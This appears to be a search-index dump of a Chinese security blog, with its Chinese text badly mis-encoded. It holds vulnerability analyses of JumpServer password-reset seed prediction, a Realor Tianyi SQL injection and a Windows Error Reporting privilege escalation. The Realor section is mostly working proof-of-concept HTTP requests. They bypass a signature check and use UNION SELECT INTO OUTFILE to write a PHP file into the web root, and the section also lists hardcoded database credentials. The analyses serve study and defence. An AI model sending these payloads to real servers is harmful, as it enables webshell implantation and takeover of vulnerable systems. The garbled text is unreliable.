10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5874 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - åœ¨æ–‡ç« ä¸­æåˆ°å¯ä»¥æœ‰ä¸¤ç§åŠæ³•ï¼š\nå¹¶å‘åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚ï¼Œé€šè¿‡å¤§é‡è¯·æ±‚ä½¿å¾—æ¯ä¸ªgunicornè¿›ç¨‹éƒ½ä¼šæ¥æ”¶åˆ°å›¾ç‰‡éªŒè¯ç çš„è¯·æ±‚ï¼Œä»è€Œå°†æ‰€æœ‰è¿›ç¨‹çš„seedè®¾ç½®ä¸ºåŒä¸€ä¸ªç§å­ï¼Œè¿™æ ·åç»­é‡ç½®å¯†ç æ—¶æ— è®ºå“ªä¸ªè¿›ç¨‹æ¥æ”¶åˆ°çš„è¯·æ±‚ï¼Œè¯¥è¿›ç¨‹çš„seedéƒ½æ˜¯å·²çŸ¥çš„ã€‚ é€šè¿‡æŸç§åŠæ³•å°†gunicornæ‰“æŒ‚ï¼Œå¹¶ç›‘æµ‹æœåŠ¡çŠ¶æ€ï¼Œå½“æœåŠ¡å“åº”ç ä»502å˜ä¸º200æ—¶ï¼Œè¯´æ˜è¿›ç¨‹æ¢å¤æ­£å¸¸ï¼Œè¿™æ—¶é€šè¿‡å°‘é‡è¯·æ±‚å³å¯å°†æ‰€æœ‰ç›®æ ‡è¿›ç¨‹çš„seedè®¾ç½®ä¸ºæˆ‘ä»¬å·²çŸ¥çš„å€¼ã€‚ å¹¶å‘å‘é€å¤§é‡è¯·æ±‚è®©æˆ‘æƒ³èµ·äº†k8sç¯å¢ƒä¸­ï¼Œpodåˆ‡æ¢IPçš„åœºæ™¯ï¼Œ æ—¶é—´æ¯”è¾ƒç´§ï¼ˆå¤ªç¬¨äº†ï¼‰ï¼Œæ²¡çœ‹å‡ºæ¥å“ªé‡Œå¯ä»¥é€ æˆcrashï¼Œåœ¨ä½¿ç”¨ç¬¬ä¸€ç§åŠæ³•çš„æ—¶å€™ï¼Œå‘ç°ä¼šæœ‰äº›è®¸é—®é¢˜\nåœ¨å‘é€å‡ åƒä¸ªè¯·æ±‚ä¹‹åï¼Œé€šè¿‡å›¾ç‰‡éªŒè¯ç è¯·æ±‚è§¦å‘é‡ç½®å¯†ç æ—¶ï¼Œåç«¯ä¼šè¿”å›è¿™ä¸ªéªŒè¯ç ä¸æ­£ç¡® åœ¨å‘é€è¯·æ±‚ä¹‹åï¼Œç»è¿‡æµ‹è¯•ä½¿ç”¨seedç”Ÿæˆå’Œjumpserverç›¸åŒçš„codeéœ€è¦ç»è¿‡å‡ ä¸‡æ¬¡ æ‰€ä»¥åœ¨è¿™é‡Œè®¨å·§ï¼Œæ‰‹åŠ¨é‡å¯core containerï¼ˆæ¨¡æ‹Ÿcrashäº†gunicornçš„åœºæ™¯ï¼‰ï¼Œè€Œåé€šè¿‡è¯·æ±‚éªŒè¯ç å›¾ç‰‡è®¾ç½®seedï¼Œç»è¿‡æµ‹è¯•æˆåŠŸçš„æ¬¡æ•°èŒƒå›´ä¸º200+ï¼Œå³æˆåŠŸç”Ÿæˆå’Œjumpserverä¸€æ ·çš„é‡ç½®å¯†ç éªŒè¯ç éœ€è¦randomä¸¤ç™¾å¤šæ¬¡ã€‚\nå°ç»“ å›è¿‡å¤´çœ‹æ–‡ç« æ‰€è¯´çš„ éšæœºæ·±åº¦ï¼ŒæŒ‰ç…§æˆ‘çš„ç†è§£å°±æ˜¯åœ¨ç”Ÿæˆcodeæ—¶ï¼Œæ‰€åœ¨è¿›ç¨‹å·²ç»randomäº†å‡ æ¬¡ï¼Œéšæœºæ¬¡æ•°è¶Šå¤šï¼Œé¢„æµ‹æ—¶æ‰€è¦çš„æ¬¡æ•°ä¹Ÿå°±è¶Šå¤šï¼Œå› ä¸ºç›¸åŒçš„seedç»è¿‡ç›¸åŒçš„æ¬¡æ•°ç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¸€æ ·çš„ï¼Œåœ¨ç”ŸæˆéªŒè¯ç å’Œrandom_stringå‡½æ•°ä¸­å‡æœ‰å¤šæ¬¡ä½¿ç”¨randomç±»å‡½æ•°ç”Ÿæˆéšæœºæ•°ï¼Œæ‰€ä»¥æ‰éœ€è¦å¾ªç¯è®¡ç®—è¿›è¡Œç¢°æ’ã€‚ åœ¨æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œé™¤äº†å‰é¢è¯´çš„è¦†ç›–seedçš„é—®é¢˜ï¼Œjumpserverè¿˜ä¼šéªŒè¯è¯·æ±‚urlé‡Œé¢çš„tokenä»¥åŠPOSTçš„bodyé‡Œé¢éœ€è¦æºå¸¦csrf tokenï¼Œè¿™äº›éƒ½å¯ä»¥é€šè¿‡urlè§£æä»¥åŠxpathä»è¯·æ±‚å“åº”ä¸­è·å–åˆ°ã€‚åœ¨ä¸€ä¸ªå°±æ˜¯ç”Ÿæˆé‡ç½®å¯†ç éªŒè¯ç åï¼Œè¿™ä¸ªéªŒè¯ç æœ‰60ç§’æœ‰æ•ˆæœŸï¼Œè¿‡äº†60ç§’ä¹‹åå†å»ç¢°æ’åç«¯ä¼šè¿”å›éªŒè¯ç å·²è¿‡æœŸï¼Œéœ€è¦é‡æ–°ç”Ÿæˆã€‚ åœ¨æœ‰ä¸ªé—®é¢˜å°±æ˜¯å›¾ç‰‡éªŒè¯ç æ¶‰åŠåˆ°æ•°å­¦è¿ç®—ï¼Œç²—ç•¥çœ‹æ¥éªŒè¯ç åº”è¯¥å¯ä»¥é€šè¿‡ocråº“è¿›è¡Œè¯†åˆ«å¹¶è®¡ç®—ï¼Œå®ç°è‡ªåŠ¨åŒ–è·å–å›¾ç‰‡åœ°å€ã€è®¾ç½®seedã€è®¡ç®—éªŒè¯ç ç­‰ï¼Œè¿™ä¸ªåªèƒ½ç­‰èŠ‚åä»”ç»†ç ”ç©¶äº†ã€‚\nå‚è€ƒé“¾æ¥\nhttps://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp\nhttps://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw\nåˆ›å»ºäº2023-09-28\nCreated at 2023-09-29T20:32:52+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/","title":"ç‘å‹å¤©ç¿¼ Rceåˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ ç‘å‹å¤©ç¿¼ä¸­å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨SQLæ³¨å…¥å†™å…¥webshellï¼Œæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ã€‚\nç¯å¢ƒæ­å»º ç•¥\nå½±å“ç‰ˆæœ¬ ç•¥\næŠ€æœ¯åˆ†æ æ•°æ®åº“åŸºæœ¬ä¿¡æ¯\n127.0.0.1:5873 db: CASSystemDS pwd: F1B5214C user: admin åœ¨ConsoleExternalApi.XGIä¸­æ ¹æ®ä»£ç é€»è¾‘å¯å¾—ï¼Œè¯·æ±‚ä¸­éœ€æºå¸¦initparamsã€keyã€signç­‰å‚æ•°\n$initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; å‚æ•°æ ¡éªŒé€»è¾‘å¦‚ä¸‹ï¼Œæ­¤æ—¶ç›´æ¥ä½¿ç”¨key=innerç»•è¿‡åˆ¤æ–­ï¼Œåˆ™$keyValå€¼ä¸ºRealorï¼Œä¸‹é¢æ‹¼æ¥äº†$initparamså’Œ$keyValå¹¶è®¡ç®—å…¶md5å€¼æ˜¯å¦å’Œsignå˜é‡ç›¸åŒã€‚\nif ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == \u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;keyå€¼ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;å‚æ•°åŠ å¯†æ–¹æ³•é”™è¯¯\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } ä¹‹åä½¿ç”¨ä¸¤ä¸ªä¸‹åˆ’çº¿åˆ†å‰²$initparamså˜é‡ï¼Œå­˜å…¥æ•°ç»„å¹¶éå†æ•°ç»„\n// ä¸¤ä¸ªä¸‹åˆ’çº¿åˆ†å‰²ï¼Œå˜æˆä¸€ä¸ªæ•°ç»„ï¼Œä¹‹åéå†æ•°ç»„ï¼Œç”¨ä¸€ä¸ªä¸‹åˆ’çº¿åˆ†å‰²å¹¶å˜æˆé”®å€¼å¯¹å­˜å…¥$requestObjå˜é‡ä¸­ã€‚ $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); if (count($paramArr) == 0) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;å‚æ•°ä¸­æœªåŒ…å«__\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•11\u0026#39;); } $requestObj = null; //testLog($paramArr); foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } ä¹‹åä»é”®å€¼å¯¹æ•°ç»„ä¸­å–å‡ºé”®ä¸ºcommandçš„å€¼ï¼Œè¿›è¡Œåˆ¤æ–­ $cmd = $requestObj['command']; å½“$cmdä¸ºcreateUseræ—¶ï¼Œä»è¯·æ±‚ä¸­å–å‡ºPOST bodyå¹¶å°è¯•è¿›è¡Œjson decodeï¼Œä»ä¸­å–å‡ºé”®ä¸ºaccountçš„å€¼æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨å•å¼•å·è¿›è¡Œsqlæ³¨å…¥ï¼Œå€ŸåŠ©union select into outfileè¯­å¥å†™å…¥webshellï¼Œè¾¾æˆä»£ç æ‰§è¡Œã€‚\nif ($cmd == \u0026#34;createUser\u0026#34;) { $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $fId = getDefaultVal($POST_JSON[\u0026#39;userGroupId\u0026#39;], getAdminGroupId()); $account = $POST_JSON[\u0026#39;account\u0026#39;]; if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·è´¦æˆ·ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·è´¦å·ä¸å¯ä¸ºç©º\u0026#39;); } $account = utf8ToGbk($account); $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;); } //è´¦å·æ˜¯å¦å·²å­˜åœ¨ $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); PoC\nGET /index.php/Index/dologin?name=aa\u0026#39;);SELECT%20%22%3C?php%20phpinfo();?%3E%22%20into%20outfile%20%22../../WebRoot/1.php%22;\u0026#39; HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close æœ€æ–°ç‰ˆpoc\nPOST /ConsoleExternalApi.XGI?initParams=command_createUser\u0026amp;key=inner\u0026amp;sign=8b21270d796c45333f88f7db36ed9dbe HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 170 {\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_importUsers\u0026amp;key=inner\u0026amp;sign=ec7e8f5769c2455b773600c2912216fd HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 183 {\u0026#34;users\u0026#34;:[{\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;bbb\u0026#34;}]} POST /ConsoleExternalApi.XGI?initParams=command_editUser__userId_usr00000010\u0026amp;key=inner\u0026amp;sign=dd1d23cb85d99349f2ab003c73df331f HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 174 {\u0026#34;userGroupId\u0026#34;:\u0026#34;aa\u0026#34;,\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_allocatedPointsToServer\u0026amp;key=inner\u0026amp;sign=a3efd6862f5d11319c6de783b58ff04a HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 142 {\u0026#34;serverId\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;pointNUm\u0026#34;:\u0026#34;aaa\u0026#34;,\u0026#34;maximumConcurrentNUm\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_getServerIpPort\u0026amp;key=inner\u0026amp;sign=94c4e967c00cb6da510b6a5e4e3c3fcc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 89 {\u0026#34;iP\u0026#34;:\u0026#34;aa\u0026#39; union select 0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_publishApp\u0026amp;key=inner\u0026amp;sign=74ed1f0c20a444c561294b4939b206dc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 100 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select \\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_editApp__appId_APP00000002\u0026amp;key=inner\u0026amp;sign=f25574d747ffbbd51496015d25438fa9 HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 223 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} ä»£ç é€»è¾‘ï¼š\n// ä¼ å…¥å‚æ•°initParams key sign $initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; // ä¸¤ä¸ªä¸‹åˆ’çº¿åˆ†å‰²$initparamsï¼Œå˜æˆä¸€ä¸ªæ•°ç»„ $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); // è®¾ç½®key inner if ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == \u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;keyå€¼ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;å‚æ•°åŠ å¯†æ–¹æ³•é”™è¯¯\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } $requestObj = null; //testLog($paramArr); // command_createuser // éå†æ•°ç»„ï¼Œå°†æ•°ç»„çš„æ¯ä¸€é¡¹é€šè¿‡_åˆ†å‰²ï¼Œå˜æˆé”®å€¼å¯¹ foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } // è·å–commandå¯¹åº”çš„å€¼ $cmd = $requestObj[\u0026#39;command\u0026#39;]; if ($cmd == \u0026#34;createUser\u0026#34;) { // ä»è¯·æ±‚ä¸­è·å–jsonæ•°æ®å¹¶decode $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $account = $POST_JSON[\u0026#39;account\u0026#39;]; // è¿™é‡Œè¦ä¿è¯è¯·æ±‚çš„jsonæ•°æ®é‡Œé¢æœ‰account if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·è´¦æˆ·ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·è´¦å·ä¸å¯ä¸ºç©º\u0026#39;); } $account = utf8ToGbk($account); // è¿™é‡Œè¦ä¿è¯è¯·æ±‚çš„jsonæ•°æ®é‡Œé¢æœ‰userPwd $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;); } //è´¦å·æ˜¯å¦å·²å­˜åœ¨ è§¦å‘æ¼æ´ $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); Created at 2023-09-20T10:04:31+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/","title":"CVE-2023-36874 Windows Error Reporting Service æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Windows error resporting serviceä¸­å­˜åœ¨æƒé™æå‡æ¼æ´ï¼Œå½“æ”»å‡»è€…å¯ä»¥åˆ›å»ºç¬¦å·é“¾æ¥åŠç›®å½•æ—¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æå‡è‡³SYSTEMæƒé™ã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º Windows 10 21H2 6æœˆè¡¥ä¸ æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸å¯¹æ¯” diff wercplsupport.dllï¼Œä¸»è¦æ”¹äº†CWerComReport::SubmitReportï¼Œwercplsupport.dllæ˜¯Windows error reporting æœåŠ¡çš„ä¸»dllæ–‡ä»¶ã€‚\nå¯¹æ¯”å‘ç°è¡¥ä¸ç›´æ¥é˜»æ–­äº†åç»­CAutoImpersonate::ImpersonateUserHighestPrivså’ŒCWerComReport::_SubmitReportçš„è°ƒç”¨\n//æœªä¿®å¤ __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } // ä¿®å¤ä»£ç  __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v11; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; if ( (unsigned __int8)wil::details::FeatureImpl\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::__private_IsEnabled(\u0026amp;`wil::Feature\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::GetImpl\u0026#39;::`2\u0026#39;::impl) ) return 0x80004001i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v11 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v11 \u0026gt;= 0) ) { v11 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v11; } æ ¹æ®å‡½æ•°åCAutoImpersonate::ImpersonateUserHighestPrivså¯çŸ¥ï¼Œè¯¥å‡½æ•°ä¸ºæ¨¡æ‹Ÿç”¨æˆ·æœ€é«˜çš„æƒé™å¹¶æäº¤report\nåŠ¨æ€è°ƒè¯•\nå¼€å¯Problem Reports Control Panel SupportæœåŠ¡ï¼Œå¯¹åº”è·¯å¾„ä¸ºC:\\Windows\\System32\\svchost.exe -k netsvcs -pã€‚ ä½¿ç”¨oleviewdotnetæŸ¥è¯¢Problem Reports Control Panel SupportæœåŠ¡å¯¹åº”çš„oleä¿¡æ¯\nå¯¹åº”çš„COMæ¥å£çš„CLSIDä¸º\nCLSID: 0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB AppID: 136A0DC7-DF5C-4271-A2AC-15DF1A1323F2 æŸ¥çœ‹è¿™ä¸ªCOMçš„æ¥å£ä¿¡æ¯ class __declspec(uuid(\u0026#34;6620c14b-70ae-4d4e-a4f6-91a7dcc582c2\u0026#34;)) IErcLuaSupport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStoreFactory** p0); }; class __declspec(uuid(\u0026#34;4904c154-426f-4c88-8ec2-4543d18670f7\u0026#34;)) IWerStoreFactory : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStore** p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ IWerStore** p0); }; class __declspec(uuid(\u0026#34;1e3a0e4f-1412-444f-8a94-fc6a09cd4195\u0026#34;)) IWerStore : public IUnknown { public: virtual HRESULT __stdcall Proc3(); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ IWerReport** p1); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); }; class __declspec(uuid(\u0026#34;d01b8f28-0bd1-4652-a415-8229f5ee506c\u0026#34;)) IWerReport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc8(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc9(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc10(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc11(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc12(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc13(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc14(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc15(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc16(/* Stack Offset: 8 */ struct Struct_1* p0); virtual HRESULT __stdcall Proc17(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc18(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc19(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc20(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc21(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc22(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ int64_t* p1, /* Stack Offset: 24 */ int64_t* p2, /* Stack Offset: 32 */ BSTR* p3, /* Stack Offset: 40 */ BSTR* p4); virtual HRESULT __stdcall Proc23(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc24(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ int64_t p1, /* Stack Offset: 24 */ IWerReportSubmitCallback* p2, /* Stack Offset: 32 */ /* unique */BSTR* p3, /* Stack Offset: 40 */ /* unique */int64_t* p4); virtual HRESULT __stdcall Proc25(); }; è¿™é‡Œéœ€è¦çŸ¥é“Windowsçš„[[../../../05 Windows/COMæ¨¡å‹/COMæ¨¡å‹ 